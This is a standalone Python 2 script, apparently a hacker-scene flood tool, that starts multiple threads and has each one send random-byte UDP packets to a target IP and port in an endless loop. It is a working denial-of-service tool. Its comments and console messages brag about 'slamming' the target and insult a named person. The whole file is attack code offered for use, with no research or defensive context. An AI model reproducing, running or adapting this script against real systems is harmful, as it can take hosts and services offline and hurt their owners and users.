#!/usr/bin/python
import socket
import threading
import random
import sys
 
 #######
 #Pieced is a hoe <3
 #######
 
class attack(threading.Thread):
     def __init__ (self, ip, port, psize):
         threading.Thread.__init__(self)
         self.ip = ip
         self.port = port
         self.psize = psize
 
     def run(self):
         print "\033[31mThread initiated|\033[35mSlamming " + self.ip + ":" + str(self.port) + "|\033[31mGetPieced Slapped that hoe"
         sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
         bytes = random._urandom(self.psize)
         while True:
             sock.sendto(bytes,(self.ip, self.port))
 
 
if len(sys.argv) < 2:
     print "Usage: "+ sys.argv[0] +" IP PORT PACKETSIZE THREADS(just put 10 <3)"
     sys.exit()
 
try:
     threads = sys.argv[4]
except NameError:
     threads = 10
except IndexError:
     threads = 10
 
try:
     if int(sys.argv[3]) > 0 and int(sys.argv[3]) <= 65500:
         psize = int(sys.argv[3])
         print psize
     else:
         psize = 1024
except IndexError:
     psize = 1024
 
 
for host in range(int(threads)):
     try:
         port = sys.argv[2]
     except IndexError:
         port = random.randrange(1, 65535, 2)
     at = attack(sys.argv[1], int(port), int(psize))
     at.start()